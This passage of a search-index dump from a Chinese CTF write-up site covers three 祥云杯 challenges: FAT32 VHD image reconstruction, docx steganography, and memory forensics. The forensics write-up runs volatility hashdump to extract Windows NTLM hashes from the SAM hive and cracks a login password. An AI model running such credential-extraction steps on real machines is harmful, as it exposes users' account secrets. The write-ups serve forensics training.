0xFE)).to_bytes(length=1, byteorder='big', signed=False) return binary FAT = FAT32Parser(\"new.vhd\") vhd = open(\"new.vhd\", \"rb\") vhd.seek(0x27bae00) # \u5b9a\u4f4d\u78c1\u76d8\u4e2d\u56fe\u7247\u4f4d\u7f6e flag = open(\"flag.png\", \"wb\") flag.write(vhd.read(8)) # \u5199\u5165png\u5934 key = 0 while True: d = read(8) length, cType = struct.unpack(\">I4s\", d) print(length, cType) # length\u4e3a\u6570\u636e\u957f\u5ea6\uff0ccType\u4e3a\u6570\u636e\u5757\u7c7b\u578b data = read(length) CRC = struct.unpack(\">I\", read(4))[0] print(CRC) rCRC = binascii.crc32(cType + data) & 0xffffffff print(rCRC) rDATA = struct.pack(\">I\", length) + cType + data + struct.pack(\">I\", rCRC) flag.write(rDATA) if CRC != rCRC: # CRC\u9519\u8bef\u7684IDAT\u6570\u636e\u5757 b_endian = struct.pack(\">I\", CRC) clusterList = struct.unpack(\"<I\", b_endian)[0] print(clusterList) vhd.seek(FAT.Cluster2DataOff(clusterList)) key = clusterList & 0xFE if cType == b\"IEND\": break \u5bf9\u78c1\u76d8\u53cd\u89e3\u51faflag.png Flag flag{0cfdd1ad80807da6c0413de606bb0ae4} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"xixixi"},{"location":"Writeup/General%20Skills/xixixi/#xixixi","text":"Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 50","title":"xixixi"},{"location":"Writeup/General%20Skills/xixixi/#description","text":"\u5ba4\u53cb\u6700\u8fd1\u6c89\u8ff7y\u795e\uff0c\u53c8\u6c2a\u53c8\u809d\uff0c\u8fd8ghs\u3002\u4e3a\u4e86\u4ed6\u7684\u8eab\u4f53\u7740\u60f3\uff0c\u6211\u628a\u4ed6\u7684s\u56fe\u6574\u6ca1\u4e86\u3002\u4f46\u6211\u660e\u660e\u5220\u4e86\u811a\u672c\u554a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u80fd\u88ab\u4ed6\u53d1\u73b0......8\u8bf4\u4e86\uff0c\u533b\u9662\u7684\u7a7a\u8c03\u771f\u8212\u670d~","title":"Description"},{"location":"Writeup/General%20Skills/xixixi/#solution","text":"\u78c1\u76d8\u5185\u6240\u6709\u5185\u5bb9\u5982\u4e0b\uff1a\uff08\u53ef\u7528winhex\u76f4\u63a5\u590d\u539f\uff09 # !i.py import struct from xixi import FAT32Parser from xixixi import Padding, picDepartList def EncodePieces(): global clusterList res = [] Range = len(picDepartList) # 58 # GetRandomClusterList(n) - Generate a random cluster list with length n clusterList = GetRandomClusterList(Range) for i in range(Range): if i != Range - 1: newCRC = struct.pack(\"<I\", clusterList[i+1]) plainData = picDepartList[i][:-4] + newCRC else: plainData = picDepartList[i] # Show the first piece to him, hhh if i == 0: newPiece = plainData else: newPiece = '' key = clusterList[i] & 0xFE for j in plainData: newPiece += chr(ord(j) ^ key) # Padding() -- Fill to an integral multiple of 512 with \\xFF res.append(Padding(newPiece)) return res # !ixi.py import struct class FAT32Parser(object): def __init__(self, vhdFileName): with open(vhdFileName, 'rb') as f: self.diskData = f.read() self.DBR_off = self.GetDBRoff() self.newData = ''.join(self.diskData) def GetDBRoff(self): DPT_off = 0x1BE target = self.diskData[DPT_off+8:DPT_off+12] DBR_sector_off, = struct.unpack(\"<I\", target) return DBR_sector_off * 512 def GetFAT1off(self): target = self.diskData[self.DBR_off+0xE:self.DBR_off+0x10] FAT1_sector_off, = struct.unpack(\"<H\", target) return self.DBR_off + FAT1_sector_off * 512 def GetFATlength(self): target = self.diskData[self.DBR_off+0x24:self.DBR_off+0x28] FAT_sectors, = struct.unpack(\"<I\", target) return FAT_sectors * 512 def GetRootoff(self): FAT_length = self.GetFATlength() FAT2_off = self.GetFAT1off() + FAT_length return FAT2_off + FAT_length def Cluster2FAToff(self, cluster): FAT1_off = self.GetFAT1off() return FAT1_off + cluster * 4 def Cluster2DataOff(self, cluster): rootDir_off = self.GetRootoff() return rootDir_off + (cluster - 2) * 512 \u5206\u6790\u4e24\u4e2a\u6587\u4ef6\uff0c\u53ef\u4ee5\u5f97\u51fa\uff1a !ixi.py\u4e2d\u7684\u7c7bFAT32Parser\uff0c\u53ef\u4ee5\u5bf9\u78c1\u76d8\u8fdb\u884c\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002!i.py\u4e2d\u7684\u6587\u4ef6\u662f\u5bf9\u6587\u4ef6\u8fdb\u884c\u5206\u5757\u513f\u5904\u7406\uff0c\u5e76\u4e14\u56fe\u7247\u88ab\u5206\u4e3a\u4e8658\u5757\u513f\uff0c\u9664\u4e86\u7b2c\u4e00\u5757\u513f\u672a\u88ab\u52a0\u5bc6\u5916\uff0c\u5176\u4f59\u5757\u513f\u90fd\u8fdb\u884c\u4e86\u5982\u4e0b\u5904\u7406\uff1a \u6bcf\u5757\u513f\u7684\u6700\u540e\u56db\u4f4d\uff0c\u5373CRC\u6821\u9a8c\u503c\u88ab\u66ff\u6362\u6210\u4e86\u4e0b\u4e00\u5757\u513f\u6240\u5728\u7684\u7c07\u53f7\u3002 \u9664\u7b2c\u4e00\u5757\u513f\u5916\uff0c\u5176\u4f59\u5757\u513f\u7684\u5185\u5bb9\u90fd\u4f1a\u4e0e\u8be5\u5757\u513f\u7684\u7c07\u53f7 & 0xFE\u6574\u4f53\u8fdb\u884c\u5f02\u6216\u3002 \u6240\u4ee5\u60f3\u8981\u53cd\u89e3\u56fe\u7247\u5757\u513f\uff0c\u9700\u8981\u5bf9\u6bcf\u4e2a\u5757\u513f\u5148\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\uff0c\u518d\u67e5\u770b\u540e\u56db\u4f4d\u5f97\u5230\u4e0b\u4e00\u5757\u513f\u7684\u7c07\u53f7\u3002 # -*- coding: utf-8 -*- # @Project: Hello Python! # @File : exp # @Author : Tr0jAn <Tr0jAn@birkenwald.cn> # @Date : 2020-11-22 import struct import binascii from xixi import FAT32Parser def read(n): global key binary = b'' for i in vhd.read(n): binary += (i ^ (key & 0xFE)).to_bytes(length=1, byteorder='big', signed=False) return binary FAT = FAT32Parser(\"new.vhd\") vhd = open(\"new.vhd\", \"rb\") vhd.seek(0x27bae00) # \u5b9a\u4f4d\u78c1\u76d8\u4e2d\u56fe\u7247\u4f4d\u7f6e flag = open(\"flag.png\", \"wb\") flag.write(vhd.read(8)) # \u5199\u5165png\u5934 key = 0 while True: d = read(8) length, cType = struct.unpack(\">I4s\", d) print(length, cType) # length\u4e3a\u6570\u636e\u957f\u5ea6\uff0ccType\u4e3a\u6570\u636e\u5757\u7c7b\u578b data = read(length) CRC = struct.unpack(\">I\", read(4))[0] print(CRC) rCRC = binascii.crc32(cType + data) & 0xffffffff print(rCRC) rDATA = struct.pack(\">I\", length) + cType + data + struct.pack(\">I\", rCRC) flag.write(rDATA) if CRC != rCRC: # CRC\u9519\u8bef\u7684IDAT\u6570\u636e\u5757 b_endian = struct.pack(\">I\", CRC) clusterList = struct.unpack(\"<I\", b_endian)[0] print(clusterList) vhd.seek(FAT.Cluster2DataOff(clusterList)) key = clusterList & 0xFE if cType == b\"IEND\": break \u5bf9\u78c1\u76d8\u53cd\u89e3\u51faflag.png","title":"Solution"},{"location":"Writeup/General%20Skills/xixixi/#flag","text":"flag{0cfdd1ad80807da6c0413de606bb0ae4}","title":"Flag"},{"location":"Writeup/General%20Skills/xixixi/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/","text":"\u5230\u70b9\u4e86 Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 40 Description \u6211\u90a3\u4e48\u591a\u9057\u61be\uff0c\u90a3\u4e48\u591a\u671f\u76fc\uff0c\u4f60\u77e5\u9053\u5417\uff08\u4e0b\u96e8\u718a\u732b\u5934 Solution \u6253\u5f001.docx\u7684\u9690\u85cf\u6587\u5b57\uff0c\u770b\u5230\u7b2c\u4e8c\u4e2a\u6587\u6863\u5bc6\u7801\u7684\u63d0\u793a \u200b \u7206\u78342.docx\u7684\u5bc6\u7801\u5f97\u5230 20201024 \u8be5\u5bc6\u7801\u540c\u65f6\u4e5f\u662f\u8be5\u6587\u4ef6\u7684\u521b\u5efa\u65f6\u95f4 \u200b \u8fdb\u51652.docx\u540ectrl+a\u5168\u9009 \u7136\u540e\u590d\u5236\u51fa\u6765\u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u57f9\u6839\u5bc6\u6587AABBAABBBAABBBAAAABBABBABABAAAAABBAAABBBBAABBBAABABABBAAABAAAABAABAABBABAAAAABAA \u5728\u7ebf\u89e3\u5bc6\u5f97GOODNIGHTSWEETIE \u200b 3.docx\u5f53\u538b\u7f29\u5305\u6253\u5f00\uff0c\u53d1\u73b04.zip\uff0c\u89e3\u538b\u5f97\u52304.bmp \u200b \u4f7f\u7528wbStego4\u5de5\u5177\u5904\u7406\u8be5bmp\u56fe\u7247 \u7b2c\u56db\u6b65\u7684\u89e3\u5bc6\u5bc6\u7801\u4e3a\u57f9\u6839\u89e3\u5bc6\u540e\u7684GOODNIGHTSWEETIE \u7136\u540e\u4e0b\u4e00\u6b65\u751f\u6210flag.txt \u62ff\u5230flag Flag flag{2ec9405ac7bcfb16f5fd494bcf21337c} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"\u5230\u70b9\u4e86"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#_1","text":"Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 40","title":"\u5230\u70b9\u4e86"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#description","text":"\u6211\u90a3\u4e48\u591a\u9057\u61be\uff0c\u90a3\u4e48\u591a\u671f\u76fc\uff0c\u4f60\u77e5\u9053\u5417\uff08\u4e0b\u96e8\u718a\u732b\u5934","title":"Description"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#solution","text":"\u6253\u5f001.docx\u7684\u9690\u85cf\u6587\u5b57\uff0c\u770b\u5230\u7b2c\u4e8c\u4e2a\u6587\u6863\u5bc6\u7801\u7684\u63d0\u793a \u200b \u7206\u78342.docx\u7684\u5bc6\u7801\u5f97\u5230 20201024 \u8be5\u5bc6\u7801\u540c\u65f6\u4e5f\u662f\u8be5\u6587\u4ef6\u7684\u521b\u5efa\u65f6\u95f4 \u200b \u8fdb\u51652.docx\u540ectrl+a\u5168\u9009 \u7136\u540e\u590d\u5236\u51fa\u6765\u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u57f9\u6839\u5bc6\u6587AABBAABBBAABBBAAAABBABBABABAAAAABBAAABBBBAABBBAABABABBAAABAAAABAABAABBABAAAAABAA \u5728\u7ebf\u89e3\u5bc6\u5f97GOODNIGHTSWEETIE \u200b 3.docx\u5f53\u538b\u7f29\u5305\u6253\u5f00\uff0c\u53d1\u73b04.zip\uff0c\u89e3\u538b\u5f97\u52304.bmp \u200b \u4f7f\u7528wbStego4\u5de5\u5177\u5904\u7406\u8be5bmp\u56fe\u7247 \u7b2c\u56db\u6b65\u7684\u89e3\u5bc6\u5bc6\u7801\u4e3a\u57f9\u6839\u89e3\u5bc6\u540e\u7684GOODNIGHTSWEETIE \u7136\u540e\u4e0b\u4e00\u6b65\u751f\u6210flag.txt \u62ff\u5230flag","title":"Solution"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#flag","text":"flag{2ec9405ac7bcfb16f5fd494bcf21337c}","title":"Flag"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/","text":"\u5c42\u5c42\u53d6\u8bc1 Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 10 Description \u9644\u4ef6\u4e0b\u8f7d \u63d0\u53d6\u7801\uff08GAME\uff09 \uff08\u672c\u9898\u9644\u4ef6\u8f83\u5927\uff09 \u9898\u76ee\u63cf\u8ff0 \u9898\u76ee\u7ed9\u6211\u4eec\u4e00\u4e2amemdump\u548c\u4e00\u4e2a\u78c1\u76d8\u6587\u4ef6\u3002 \u6211\u7684\u89e3\u7b54 \u53ef\u4ee5\u7528volatility\u770bmemdump\uff0c filescan \u548c cmdscan \u53ef\u4ee5\u53d1\u73b0\u9898\u76ee\u662f\u7528\u4e86\u4e00\u4e2a\u53eb\u4f5cFTK Imager\u7684\u8f6f\u4ef6\u5f04\u51fa\u6765\u7684\u955c\u50cf\u3002 \u6211\u4eec\u5c1d\u8bd5\u7528DiskGenius\u6253\u5f00\u78c1\u76d8\u6587\u4ef6\uff0c\u5728\u684c\u9762\u5f97\u5230\u4e86\u4e2a flag.txt \u3002\u3002 \u674e\u6c0f\u795e\u9b54\u604b \u53ef\u80fd\u662f\u63d0\u793a\u8981\u4eff\u771f\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5632\u8bbd\u3002\u5148\u4e0d\u7ba1\u4ed6\u3002\u4e0b\u9762\u8fd8\u6709\u4e2aBitLocker\u52a0\u5bc6\u7684\u5206\u533a \u54df\uff1f \u5c1d\u8bd5\u56de\u5230\u5185\u5b58\u53d6\u8bc1\uff0c\u7528 filescan \u627e\u5176\u4ed6\u6587\u4ef6\u4f46\u662f\u65e0\u679c\uff0c\u7528 hivelist \u4ee5\u53ca hashdump \u627e\u5230\u64cd\u4f5c\u7cfb\u7edf\u7684\u8d26\u53f7\u5bc6\u7801\uff1a volatility -f \"memdump/memdump.mem\" --profile=Win7SP1x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xfffff8a000ce7410 0x000000001a045410 \\SystemRoot\\System32\\Config\\SAM 0xfffff8a000dcb010 0x0000000019482010 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT 0xfffff8a000e5f010 0x00000000199c9010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xfffff8a0013f1010 0x000000000a8d3010 \\??\\C:\\Users\\XiaoMing\\ntuser.dat 0xfffff8a001409010 0x000000000a56e010 \\??\\C:\\Users\\XiaoMing\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat 0xfffff8a00605c010 0x000000003c087010 \\SystemRoot\\System32\\Config\\DEFAULT 0xfffff8a00000f010 0x0000000022787010 [no name] 0xfffff8a000024010 0x0000000023512010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000060410 0x00000000211d0410 \\REGISTRY\\MACHINE\\HARDWARE 0xfffff8a0002bb010 0x000000003c017010 \\Device\\HarddiskVolume3\\Boot\\BCD 0xfffff8a000334010 0x0000000000b83010 \\SystemRoot\\System32\\Config\\SOFTWARE 0xfffff8a000c96010 0x0000000017104010 \\SystemRoot\\System32\\Config\\SECURITY volatility -f \"memdump/memdump.mem\" --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000ce7410 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: XinSai:1000:aad3b435b51404eeaad3b435b51404ee:27caa41e7118fd4429d9b9cbd87aaa40::: XiaoMing:1001:aad3b435b51404eeaad3b435b51404ee:92efa7f9f2740956d51157f46521f941::: \u7136\u540e\u53bb cmd5 \u5c1d\u8bd5\u67e5\u8be2NTLM Hash\uff0c\u53d1\u73b0XiaoMing\u548cXinSai\u7684\u90fd\u67e5\u4e0d\u51fa\uff0c\u4f46\u662fAdministrator\u548cGuest\u7684\u90fd\u662f\u7a7a\u5bc6\u7801\u3002\uff08XiaoMing\u7684NTLM Hash\u5728cmd5\u4e2d\u662f\u4e00\u6761\u4ed8\u8d39\u8bb0\u5f55\uff09 \u56de\u5230\u78c1\u76d8\u4e2d\uff0c\u6211\u4eec\u518d\u7ffb\u4e00\u7ffb\uff0c\u53d1\u73b0\u78c1\u76d8\u4e2d\u53ef\u4ee5\u5728 \\Users\\XiaoMing\\AppData\\Local\\Temp \u91cc\u9762\u627e\u5230\u4e24\u4e2a\u6d41\u91cf\u5305\uff0c\u5176\u4e2d\u5728 wireshark_4D9DE10B-B9DF-4EFF-93CB-50C8BB2AF217_20200813223005_a03980.pcapng \u8fd9\u4e2a\u6d41\u91cf\u5305\u91cc\u9762\u641cflag\u53d1\u73b0\u4e00\u4e2aUDP\u6d41\u91cc\u9762\u627e\u5230\u4e86 flag.docx \uff0c\u5b83\u5728\u4e00\u4e2aRAR\u538b\u7f29\u5305\u91cc\u9762\u3002 \u6211\u4eec\u5bfc\u51fa\u8fd9\u4e2aRAR\u538b\u7f29\u5305\uff0c\u4e0d\u8fc7\u5c1d\u8bd5\u89e3\u538b\u7684\u65f6\u5019\u8981\u5bc6\u7801\u3002 \u76f4\u63a5\u6253\u5f00\u8fd9\u4e2aRAR\u538b\u7f29\u5305\uff0c\u63d0\u793a\u538b\u7f29\u5305\u5bc6\u7801\u8ddf\u5f00\u673a\u5bc6\u7801\u76f8\u540c\u3002 \u53e6\u5916\uff0c\u78c1\u76d8\u684c\u9762\u4e0a\u63d0\u793a\u8981\u4eff\u771f\u6253\u5f00\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4ed6\u90a3\u4e2a\u78c1\u76d8\u6587\u4ef6\u7528DiskGenius\u8f6c\u6210vmdk\uff0c\u518d\u7528vmware\u6253\u5f00\u3002 \u53ef\u4ee5\u8fdb\u5165\u5230\u6b22\u8fce\u9875\u9762\uff0c\u4f46\u662f\u65e0\u8bba\u4ee5\u8d26\u6237XiaoMing\u8fd8\u662fXinSai(xm)\u8fdb\u5165\u7cfb\u7edf\u90fd\u8981\u767b\u5f55\u5bc6\u7801\u3002 \u505a\u5230\u8fd9\u91cc\uff0c\u73b0\u5728\u6709\u4e24\u4e2a\u672a\u77e5\uff1aBitLocker\u7684\u5bc6\u7801\u548c\u7cfb\u7edf\u7684\u767b\u9646\u5bc6\u7801\uff08\u63d0\u793a\u548c\u538b\u7f29\u5305\u5bc6\u7801\u4e00\u6837\uff09 \u6211\u4eec\u5c1d\u8bd5cmd5\u91cc\u9762\u4ed8\u8d39\u67e5\u8be2\u90a3\u4e2aXiaoMing\u7684NTLM Hash\u8bb0\u5f55\u3002\u67e5\u5f97\u4e3a\uff1a xiaoming_handsome \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5f00\u673a\u5bc6\u7801\uff0c\u548c\u538b\u7f29\u5305\u7684\u89e3\u538b\u5bc6\u7801\u3002 \u5c1d\u8bd5\u628a\u538b\u7f29\u5305\u89e3\u538b\u51fa\u6765\uff0c\u7ed3\u679c\u89e3\u538b\u51fa\u6765\u4e86 flag.docx \u6587\u4ef6\uff0c\u4f46\u662f\u53d1\u73b0 flag.docx \u4e5f\u662f\u9700\u8981\u5bc6\u7801\u624d\u80fd\u6253\u5f00\u7684\u3002 VMware\u4e2d\u53ef\u4ee5\u8f93\u5bc6\u7801\u8fdb\u7cfb\u7edf\uff0c\u5f15\u5165\u773c\u5e18\u7684\u4e3a\u5982\u4e0bWindows 7\u4fbf\u7b3a\uff1a \u90a3\u4f60\u4e3a\u4ec0\u4e48\u4e0d\u5e72\u8106\u4e00\u7801\u901a\u5f97\u4e86 \u6211\u4eec\u731c\u6d4b\u662f\u6709\u5176\u4ed6\u7684Windows 7\u4fbf\u7b3a\uff0c\u6240\u4ee5\u67e5\u770b\u4fbf\u7b3a\u5b58\u653e\u5728\u78c1\u76d8\u4e2d\u7684\u8def\u5f84\uff1a https://answers.microsoft.com/zh-hans/windows/forum/all/windows-7-%E4%BE%BF%E7%AC%BA/0712dba1-9349-e011-8dfc-68b599b31bf5 \u641c\u5230\u8def\u5f84\u540e\uff0c\u590d\u5236\u51fa\u6765\uff0c\u62d6\u8fdb010 Editor\u67e5\u770b\uff1a Aw\u524d\u7f00 \u8fd9\u91cc\u5927\u6982\u5c31\u662f\u684c\u9762\u4e0a\u6211\u4eec\u80fd\u770b\u5230\u7684\u90a3\u4e2a\u4fbf\u7b3a\u4e0a\u7684\u5185\u5bb9\uff0c\u518d\u5f80\u4e0b\u4e00\u70b9\u70b9\uff1a word \u770b\u5230word\uff0c\u7136\u540e\u4e0b\u9762\u5c31\u662f xiaoming1314 \uff0c\u731c\u6d4b\u662f flag.docx \u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u540e\u53d1\u73b0\u6b63\u786e\uff0c\u5e76\u5229\u7528\u5176\u6253\u5f00 flag.docx \u4fbf\u5f97\u5230flag\u3002 Flag flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2} Reference Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"\u5c42\u5c42\u53d6\u8bc1"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#_1","text":"Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 10","title":"\u5c42\u5c42\u53d6\u8bc1"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#description","text":"\u9644\u4ef6\u4e0b\u8f7d \u63d0\u53d6\u7801\uff08GAME\uff09 \uff08\u672c\u9898\u9644\u4ef6\u8f83\u5927\uff09","title":"Description"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#_2","text":"\u9898\u76ee\u7ed9\u6211\u4eec\u4e00\u4e2amemdump\u548c\u4e00\u4e2a\u78c1\u76d8\u6587\u4ef6\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#_3","text":"\u53ef\u4ee5\u7528volatility\u770bmemdump\uff0c filescan \u548c cmdscan \u53ef\u4ee5\u53d1\u73b0\u9898\u76ee\u662f\u7528\u4e86\u4e00\u4e2a\u53eb\u4f5cFTK Imager\u7684\u8f6f\u4ef6\u5f04\u51fa\u6765\u7684\u955c\u50cf\u3002 \u6211\u4eec\u5c1d\u8bd5\u7528DiskGenius\u6253\u5f00\u78c1\u76d8\u6587\u4ef6\uff0c\u5728\u684c\u9762\u5f97\u5230\u4e86\u4e2a flag.txt \u3002\u3002 \u674e\u6c0f\u795e\u9b54\u604b \u53ef\u80fd\u662f\u63d0\u793a\u8981\u4eff\u771f\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5632\u8bbd\u3002\u5148\u4e0d\u7ba1\u4ed6\u3002\u4e0b\u9762\u8fd8\u6709\u4e2aBitLocker\u52a0\u5bc6\u7684\u5206\u533a \u54df\uff1f \u5c1d\u8bd5\u56de\u5230\u5185\u5b58\u53d6\u8bc1\uff0c\u7528 filescan \u627e\u5176\u4ed6\u6587\u4ef6\u4f46\u662f\u65e0\u679c\uff0c\u7528 hivelist \u4ee5\u53ca hashdump \u627e\u5230\u64cd\u4f5c\u7cfb\u7edf\u7684\u8d26\u53f7\u5bc6\u7801\uff1a volatility -f \"memdump/memdump.mem\" --profile=Win7SP1x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xfffff8a000ce7410 0x000000001a045410 \\SystemRoot\\System32\\Config\\SAM 0xfffff8a000dcb010 0x0000000019482010 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT 0xfffff8a000e5f010 0x00000000199c9010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xfffff8a0013f1010 0x000000000a8d3010 \\??\\C:\\Users\\XiaoMing\\ntuser.dat 0xfffff8a001409010 0x000000000a56e010 \\??\\C:\\Users\\XiaoMing\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat 0xfffff8a00605c010 0x000000003c087010 \\SystemRoot\\System32\\Config\\DEFAULT 0xfffff8a00000f010 0x0000000022787010 [no name] 0xfffff8a000024010 0x0000000023512010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000060410 0x00000000211d0410 \\REGISTRY\\MACHINE\\HARDWARE 0xfffff8a0002bb010 0x000000003c017010 \\Device\\HarddiskVolume3\\Boot\\BCD 0xfffff8a000334010 0x0000000000b83010 \\SystemRoot\\System32\\Config\\SOFTWARE 0xfffff8a000c96010 0x0000000017104010 \\SystemRoot\\System32\\Config\\SECURITY volatility -f \"memdump/memdump.mem\" --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000ce7410 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: XinSai:1000:aad3b435b51404eeaad3b435b51404ee:27caa41e7118fd4429d9b9cbd87aaa40::: XiaoMing:1001:aad3b435b51404eeaad3b435b51404ee:92efa7f9f2740956d51157f46521f941::: \u7136\u540e\u53bb cmd5 \u5c1d\u8bd5\u67e5\u8be2NTLM Hash\uff0c\u53d1\u73b0XiaoMing\u548cXinSai\u7684\u90fd\u67e5\u4e0d\u51fa\uff0c\u4f46\u662fAdministrator\u548cGuest\u7684\u90fd\u662f\u7a7a\u5bc6\u7801\u3002\uff08XiaoMing\u7684NTLM Hash\u5728cmd5\u4e2d\u662f\u4e00\u6761\u4ed8\u8d39\u8bb0\u5f55\uff09 \u56de\u5230\u78c1\u76d8\u4e2d\uff0c\u6211\u4eec\u518d\u7ffb\u4e00\u7ffb\uff0c\u53d1\u73b0\u78c1\u76d8\u4e2d\u53ef\u4ee5\u5728 \\Users\\XiaoMing\\AppData\\Local\\Temp \u91cc\u9762\u627e\u5230\u4e24\u4e2a\u6d41\u91cf\u5305\uff0c\u5176\u4e2d\u5728 wireshark_4D9DE10B-B9DF-4EFF-93CB-50C8BB2AF217_20200813223005_a03980.pcapng \u8fd9\u4e2a\u6d41\u91cf\u5305\u91cc\u9762\u641cflag\u53d1\u73b0\u4e00\u4e2aUDP\u6d41\u91cc\u9762\u627e\u5230\u4e86 flag.docx \uff0c\u5b83\u5728\u4e00\u4e2aRAR\u538b\u7f29\u5305\u91cc\u9762\u3002 \u6211\u4eec\u5bfc\u51fa\u8fd9\u4e2aRAR\u538b\u7f29\u5305\uff0c\u4e0d\u8fc7\u5c1d\u8bd5\u89e3\u538b\u7684\u65f6\u5019\u8981\u5bc6\u7801\u3002 \u76f4\u63a5\u6253\u5f00\u8fd9\u4e2aRAR\u538b\u7f29\u5305\uff0c\u63d0\u793a\u538b\u7f29\u5305\u5bc6\u7801\u8ddf\u5f00\u673a\u5bc6\u7801\u76f8\u540c\u3002 \u53e6\u5916\uff0c\u78c1\u76d8\u684c\u9762\u4e0a\u63d0\u793a\u8981\u4eff\u771f\u6253\u5f00\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4ed6\u90a3\u4e2a\u78c1\u76d8\u6587\u4ef6\u7528DiskGenius\u8f6c\u6210vmdk\uff0c\u518d\u7528vmware\u6253\u5f00\u3002 \u53ef\u4ee5\u8fdb\u5165\u5230\u6b22\u8fce\u9875\u9762\uff0c\u4f46\u662f\u65e0\u8bba\u4ee5\u8d26\u6237XiaoMing\u8fd8\u662fXinSai(xm)\u8fdb\u5165\u7cfb\u7edf\u90fd\u8981\u767b\u5f55\u5bc6\u7801\u3002 \u505a\u5230\u8fd9\u91cc\uff0c\u73b0\u5728\u6709\u4e24\u4e2a\u672a\u77e5\uff1aBitLocker\u7684\u5bc6\u7801\u548c\u7cfb\u7edf\u7684\u767b\u9646\u5bc6\u7801\uff08\u63d0\u793a\u548c\u538b\u7f29\u5305\u5bc6\u7801\u4e00\u6837\uff09 \u6211\u4eec\u5c1d\u8bd5cmd5\u91cc\u9762\u4ed8\u8d39\u67e5\u8be2\u90a3\u4e2aXiaoMing\u7684NTLM Hash\u8bb0\u5f55\u3002\u67e5\u5f97\u4e3a\uff1a xiaoming_handsome \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5f00\u673a\u5bc6\u7801\uff0c\u548c\u538b\u7f29\u5305\u7684\u89e3\u538b\u5bc6\u7801\u3002 \u5c1d\u8bd5\u628a\u538b\u7f29\u5305\u89e3\u538b\u51fa\u6765\uff0c\u7ed3\u679c\u89e3\u538b\u51fa\u6765\u4e86 flag.docx \u6587\u4ef6\uff0c\u4f46\u662f\u53d1\u73b0 flag.docx \u4e5f\u662f\u9700\u8981\u5bc6\u7801\u624d\u80fd\u6253\u5f00\u7684\u3002 VMware\u4e2d\u53ef\u4ee5\u8f93\u5bc6\u7801\u8fdb\u7cfb\u7edf\uff0c\u5f15\u5165\u773c\u5e18\u7684\u4e3a\u5982\u4e0bWindows 7\u4fbf\u7b3a\uff1a \u90a3\u4f60\u4e3a\u4ec0\u4e48\u4e0d\u5e72\u8106\u4e00\u7801\u901a\u5f97\u4e86 \u6211\u4eec\u731c\u6d4b\u662f\u6709\u5176\u4ed6\u7684Windows 7\u4fbf\u7b3a\uff0c\u6240\u4ee5\u67e5\u770b\u4fbf\u7b3a\u5b58\u653e\u5728\u78c1\u76d8\u4e2d\u7684\u8def\u5f84\uff1a 